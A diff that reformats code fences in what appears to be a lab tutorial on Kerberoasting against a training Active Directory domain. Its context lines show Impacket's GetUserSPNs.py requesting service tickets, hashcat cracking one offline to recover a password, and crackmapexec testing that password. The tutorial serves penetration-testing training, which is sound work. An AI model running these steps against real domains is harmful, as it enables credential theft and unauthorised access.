@@ -59,8 +59,7 @@ Let's start by installing the Impacket toolkit, which we can grab from [Here](ht
 
 #### Installing Impacket using Pip
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python3 -m pip install .
 
 Processing /opt/impacket
@@ -78,8 +77,7 @@ This will install all Impacket tools and place them in our PATH so we can call t
 
 #### Listing GetUserSPNs.py Help Options
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetUserSPNs.py -h
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -104,8 +102,7 @@ We can start by just gathering a listing of SPNs in the domain. To do this, we w
 
 #### Listing SPN Accounts with GetUserSPNs.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -125,8 +122,7 @@ We can now pull all TGS tickets for offline processing using the `-request` flag
 
 #### Requesting all TGS Tickets
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -151,8 +147,7 @@ We can also be more targeted and request just the TGS ticket for a specific acco
 
 #### Requesting a Single TGS ticket
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -171,8 +166,7 @@ To facilitate offline cracking, it is always good to use the `-outputfile` flag 
 
 #### Saving the TGS Ticket to an Output File
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
 
 Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation
@@ -187,8 +181,7 @@ Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_
 
 #### Cracking the Ticket Offline with Hashcat
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
 
 hashcat (v6.1.1) starting...
@@ -223,8 +216,7 @@ We've successfully cracked the user's password as `database!`. As the last step,
 
 #### Testing Authentication against a Domain Controller
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
 
 SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
